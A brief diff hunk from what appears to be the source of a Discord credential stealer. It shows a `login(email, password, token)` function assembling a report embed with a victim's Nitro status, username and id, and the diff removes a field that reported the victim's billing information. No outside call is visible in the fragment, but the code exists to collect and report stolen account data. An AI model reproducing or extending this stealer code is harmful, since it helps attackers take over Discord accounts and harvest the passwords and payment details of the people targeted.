@@ -684,11 +684,6 @@ const login = async (email, password, token) => {
             value: `${nitro}`,
             inline: true,
           },
-          {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing:',
-            value: `${billing}`,
-            inline: true,
-          },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
